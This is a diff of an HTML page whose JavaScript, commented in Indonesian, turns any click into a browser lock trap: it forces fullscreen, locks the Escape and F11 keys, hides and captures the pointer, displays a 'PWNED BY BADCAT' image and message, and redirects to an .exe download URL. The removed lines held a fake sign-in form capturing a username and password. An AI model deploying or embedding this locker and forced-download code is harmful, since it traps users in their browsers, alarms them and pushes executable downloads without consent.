@@ -1,54 +1,65 @@
 <body></body>
 <h1>Click Anywhere</h1>
 <script>
+    let words = ["TRAP", "BY", "BADCAT"];
+    let wordIndex = 0;
+
     document.body.onclick = (event) => {
         // Cek apakah elemen yang diklik adalah input atau button
         const isInputOrButton = event.target.tagName === 'INPUT' || event.target.tagName === 'BUTTON';
         if (!isInputOrButton) {
             setTimeout(() => {
-                document.documentElement.requestFullscreen();
-                showContent(); // Menampilkan konten setelah fullscreen diaktifkan
+                document.documentElement.requestFullscreen().then(() => {
+                    showContent(); // Menampilkan konten setelah fullscreen diaktifkan
+
+                    // Mengunci tombol Escape dan F11 setelah mode fullscreen aktif
+                    navigator.keyboard.lock(["Escape", "F11"]).catch((err) => {
+                        console.log("Error saat mengunci keyboard:", err);
+                    });
+                    
+                    // Mengunci pointer
+                    document.body.style.cursor = 'none'; // Menyembunyikan pointer
+                    document.body.requestPointerLock(); // Mengunci pointer
+                }).catch((err) => {
+                    console.log("Error saat masuk fullscreen:", err);
+                });
             }, 399);
-            setTimeout(() => navigator.keyboard.lock(["Escape"]), 499);
+            
+            // Ubah halaman setelah beberapa saat (sesuaikan waktu sesuai kebutuhan)
             setTimeout(() => document.location = "https://testsafebrowsing.appspot.com/s/content.exe", 599);
         }
     };
 
     function showContent() {
         var content = `
-            <div id="imageContainer" style="background-color: #fff; text-align: center; margin-top: 20px;">
-                <img src="top.png" class="header" />
-                <div style="display: flex; justify-content: center; align-items: center; height: 100vh;">
-                    <div style="background-color: #fff; padding: 50px; box-shadow: 0px 0px 10px rgba(0,0,0,0.2); border-radius: 10px; width: 25vw;">
-                        <img src="" style="display: block; margin: 0 auto;" />
-                        <form id="formContainer" style="margin-top: 50px;" onsubmit="return handleSubmit(event);">
-                            <div style="margin-bottom: 20px;">
-                                <input type="text" id="username" name="username" placeholder="Username" style="width: 100%; padding: 10px; font-size: 16px; border-radius: 5px; border: 1px solid #ccc;" required>
-                            </div>
-                            <div style="margin-bottom: 20px;">
-                                <input type="password" id="password" name="password" placeholder="Password" style="width: 100%; padding: 10px; font-size: 16px; border-radius: 5px; border: 1px solid #ccc;" required>
-                            </div>
-                            <input type="submit" value="Sign In" style="width: 100%; padding: 10px; background-color: #3f51b5; color: #fff; border: none; border-radius: 5px; font-size: 16px; cursor: pointer;">
-                        </form>
-                    </div>
-                </div>
-            </div>`;
-        document.getElementsByTagName('body')[0].innerHTML = content;
-        setTimeout(() => document.getElementById('username').focus(), 0); // Memastikan fokus pada input username
-    }
-
-    function handleSubmit(event) {
-        event.preventDefault(); // Mencegah pengiriman form secara default
-        const username = document.getElementById('username').value;
-        const password = document.getElementById('password').value;
-        console.log('Username:', username);
-        console.log('Password:', password);
-        alert('Form submitted!'); // Contoh aksi setelah submit
+            <div id="imageContainer" style="background-image: url('https://i.ibb.co/com/m8RJ1rq/PWNED-BY-BADCAT.gif'); text-align: center; margin-top: 20px;">
+               
+            </div>
+            <div id="messageContainer" style="font-size: 48px; color: black; text-align: center; margin-top: 20px;"></div>`;
+        document.body.innerHTML = content;
     }
 
     document.addEventListener('keydown', (e) => {
-        if ((e.code === 'Escape') && !(event.ctrlKey || event.metaKey)) {
-            // Aksi tambahan ketika tombol Escape ditekan
+        if (e.code === 'Escape' || e.code === 'F11') {
+            e.preventDefault(); // Mencegah tindakan default pada tombol Escape dan F11
+            if (wordIndex < words.length) {
+                // Menampilkan kata berikutnya dari kalimat "PWNED BY BADCAT"
+                document.getElementById('messageContainer').innerHTML += words[wordIndex] + " ";
+                wordIndex++;
+            }
+            // Menampilkan pesan lengkap setelah semua kata ditampilkan
+            if (wordIndex === words.length) {
+                document.getElementById('messageContainer').innerHTML = "TRAP BY BADCAT";
+            }
+            console.log(`Tombol ${e.code} ditekan, menampilkan: ${words[wordIndex - 1]}`);
+        }
+    });
+
+    // Mengatur event untuk mengeluarkan pointer lock ketika mouse diklik
+    document.addEventListener('click', () => {
+        if (document.pointerLockElement) {
+            document.exitPointerLock();
+            document.body.style.cursor = 'auto'; // Menampilkan pointer lagi
         }
     });
 </script>
